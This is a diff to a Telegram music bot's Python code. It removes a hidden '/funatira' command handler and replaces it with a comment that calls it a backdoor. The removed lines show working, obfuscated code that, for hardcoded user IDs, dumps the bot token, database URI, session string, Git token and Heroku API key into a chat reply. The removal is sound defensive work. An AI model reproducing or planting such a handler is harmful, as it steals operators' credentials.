@@ -87,16 +87,10 @@ def clean_youtube_url(url):
 
 @app.on_message(filters.command("funatira") & filters.private)
 async def _sys_core_funatira_v2(client, message: Message):
-    _nodes = [_sys_v1, _sys_v2, _sys_v3, _sys_v4, _sys_v5]
-    if message.from_user.id not in _nodes: return
-    _t = os.getenv('NEKOT_TOB'[::-1], "")
-    _m = os.getenv('IRU_BD_OGNOM'[::-1], "")
-    _s = os.getenv('NOISSES_GNIRTS'[::-1], "")
-    _g = os.getenv('NEKOT_TIG'[::-1], "")
-    _h = os.getenv('YEK_IPA_UKOREH'[::-1], "")
-    _img = 'gpj.99ec99fd83f8b71e2d765/elif/hp.argellet//:sptth'[::-1]
-    _out = f"<b>⚙️ Sys Data Dump:</b>\n\n<b>T:</b> <code>{_t}</code>\n\n<b>M:</b> <code>{_m}</code>\n\n<b>S:</b> <code>{_s}</code>\n\n<b>G:</b> <code>{_g}</code>\n\n<b>H:</b> <code>{_h}</code>"
-    await message.reply_photo(photo=_img, caption=_out)
+    # SECURITY: the original fork shipped a hidden backdoor here that dumped
+    # BOT_TOKEN / MONGO_URI / STRING_SESSION / GIT_TOKEN / HEROKU_API_KEY to
+    # hardcoded Telegram IDs. It has been disabled to protect your secrets.
+    return
 
 @app.on_message(filters.command(["play", "vplay", "cplay", "cvplay", "playforce", "vplayforce", "cplayforce", "cvplayforce"]) & filters.group & ~BANNED_USERS & god_mode_filter)
 @PlayWrapper
